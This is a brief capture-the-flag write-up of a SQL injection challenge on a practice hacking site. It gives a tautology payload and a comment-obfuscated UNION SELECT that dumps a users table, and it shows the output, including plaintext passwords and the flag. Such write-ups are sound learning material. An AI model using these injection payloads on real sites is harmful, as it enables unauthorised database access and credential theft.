# Challenge 1
  - https://canyouhack.us/c/14892b6aa415e8a154424f8c1a3a9aa3


## SQL Injection

It's clear that the form field isn't sanitizing user input and passing raw SQL statements to the DB.

`' or 1=1 --` gives us:

```
Results:
1		Cryptonomicon		Neal Stephenson		Avon		2002		978-0060512804
2		1984		George Orwell		Secker and Warburg		1949		978-0-14-118776-1
3		Anathem		Neal Stephenson		HarperCollins Publishers		2009		978-0061474101
4		Neuromancer		William Gibson		Ace		1984		0-441-56956-0
5		Superintelligence		Nick Bostrom		Oxford University Press		2014		978-0199678112
```

This is the query it's passing

`SELECT * FROM books WHERE title=''`

So modifying it to read from the users table through the form field reveals what we need

`'/**/UNION/**/Select/**/*/**/FROM/**/users--`

```
Results:
1		bob		bob@mailinator.com		bobbobberson!		1		1
2		jim		jim@gmail.com		jimisthebest123		1		1
3		flag		you.got@me.com		a518de63035f6de0f5f6a6e95b07d1b2		1		1
4		jill		jill@mailtothis.com		jackandjill1		1		1
```
